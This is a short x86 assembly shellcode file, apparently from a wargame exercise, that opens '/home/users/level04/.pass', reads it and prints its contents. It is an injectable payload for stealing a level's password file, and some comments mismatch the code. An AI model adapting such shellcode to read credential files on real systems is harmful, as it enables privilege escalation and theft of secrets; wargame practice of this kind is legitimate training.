; nasm -pie -f elf32 -o out.o

_start:
	; this is how we get a string "OPQRKLMNGHIJCDEF89AB4567123"
    ; we want to push             "/home/users/level05/.pass\0" to the stack
    push 0x00000073; "s\0\0\0"
    push ".pas"
    push "l04/"
    push "leve"
    push "ers/"
    push "e/us"
    push "/hom"

    ; open(filename, 0, 0)
    mov eax, 5
    xor ecx, ecx
    xor edx, edx
    mov ebx, esp
    int	0x80

    ; read(fd, buffer, 100)
    mov ebx, eax
    mov eax, 3
    mov ecx, esp
    mov edx, 100
    int	0x80
    
    ; read(fd, buffer, 100)
    mov ebx, 1
    mov edx, eax
    mov eax, 4
    mov ecx, esp
    int	0x80
    
    xor ebx, ebx
    xor eax, eax
    inc eax
    int	0x80
    

